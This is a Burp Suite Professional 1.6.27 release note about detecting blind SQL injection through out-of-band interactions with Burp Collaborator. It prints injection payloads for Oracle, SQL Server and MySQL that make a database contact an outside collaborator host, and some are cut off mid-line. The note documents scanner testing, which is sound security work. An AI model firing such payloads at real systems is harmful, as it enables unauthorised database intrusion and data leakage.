# Professional 1.6.27

Source: https://portswigger.net/burp/releases/professional-1-6-27
Fetched: 2026-06-28T09:16:27.824444+00:00

This release adds the ability to detect completely blind SQL injection by triggering interactions with Burp Collaborator.

Previously, Burp Scanner has used various evidence to detect SQL injection, including:

Error messages

Differential responses through injected Boolean conditions

Time delays

Each of these techniques involves sending payloads designed to trigger some kind of difference in the application's immediate response, whether in its actual contents or the time taken to receive it. In some situations, SQL injection conditions can exist that just cannot be found in this way, because there is no way to induce any difference in the application's immediate response.

Enter Burp Collaborator. Burp Scanner now sends payloads like:

'||(select extractvalue(xmltype(

'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [

<!ENTITY % glrvh SYSTEM "http://fcvlarzebywms16gggoy7tvo.burpcollaborator.net/">%glrvh;]>'

),'/l') from dual)||'';exec master.dbo.xp_dirtree'+(select load_file(

and reports an appropriate issue based on any observed interactions (DNS or HTTP) that reach the Burp Collaborator server.

The above payloads work, respectively, on Oracle, Microsoft SQL Server, and MySQL (running on Windows). Each payload breaks out of the existing SQL query context and uses a database-specific technique to induce the database to perform some kind of network interaction with Burp Collaborator, through either a web URL or a UNC file path.

As things stand, having searched high and low, we have yet to find a similar technique that works against MySQL running on Linux. We would be highly appreciative if anyone can come up with a generic and feasible payload that safely induces MySQL on Linux to interact with an arbitrary external domain, without causing damage to any target systems or data. The first person to email us a qualifying payload will be quite literally showered in Burp Suite swag, including a highly-coveted T-shirt.
